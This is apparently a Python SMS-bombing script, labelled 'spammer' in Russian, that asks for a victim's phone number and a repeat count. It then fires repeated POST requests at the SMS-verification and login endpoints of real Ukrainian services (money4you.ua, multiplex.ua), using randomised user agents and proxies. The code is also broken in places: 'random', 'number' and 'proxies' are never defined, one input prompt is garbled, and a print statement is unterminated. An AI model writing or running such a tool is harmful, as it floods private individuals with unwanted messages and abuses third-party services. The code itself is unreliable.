#Библиотеки
import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#Обозначение
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('[green]Beeante HOMeP tenedona: (бes + ')



run = int(console.input('[green]Введите количество повторов (1-35):\n[blue]spammer>> '))
for _ in track(range(run)):
                    try:
                        requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", data={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers, proxies=proxies)
                        print("отправлена")
                    except:
                        print( YT отправлена")
                    try:
                        requests.post("https://auth.multiplex.ua/login", data={"login": "+" + number}, headers=headers)
                        print('multiplex')
                    except:
                        print('Не доставлено (multiplex)')
